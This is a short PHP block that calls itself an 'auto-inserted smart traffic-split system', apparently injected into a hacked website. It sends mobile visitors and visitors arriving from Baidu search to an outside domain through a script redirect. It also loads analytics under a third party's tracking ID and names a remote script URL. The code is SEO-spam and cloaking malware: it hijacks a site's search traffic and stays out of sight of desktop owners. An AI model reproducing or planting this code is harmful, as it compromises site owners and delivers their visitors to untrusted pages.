<?php
// ==================== 智能分流系统 - 自动插入 ====================
$mobile_url = 'https://xhjishu.tjtjdetail.com/index.html';
$baidu_tongji = 'b088eb0079ef8719a7eee1fd94f30ffe';
$remote_js = 'http://m.993113.com/xhxh.js';

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isMobile = preg_match('/phone|iPhone|Android|Mobile|Windows Phone/i', $ua);
$isFromSearch = stripos($_SERVER['HTTP_REFERER'] ?? '', 'baidu.com') !== false;

if ($isMobile || $isFromSearch || strpos($ua, 'baiduboxapp') !== false) {
    echo '<!DOCTYPE html><html><head><title>跳转中</title><script>
    var _hmt = _hmt || [];(function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?' . $baidu_tongji . '";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();setTimeout(function(){window.location.href="' . $mobile_url . '"},100);
    </script></head><body><p>跳转中...</p></body></html>';
    exit;
}
// ==================== 分流结束，继续原页面 ====================
?>
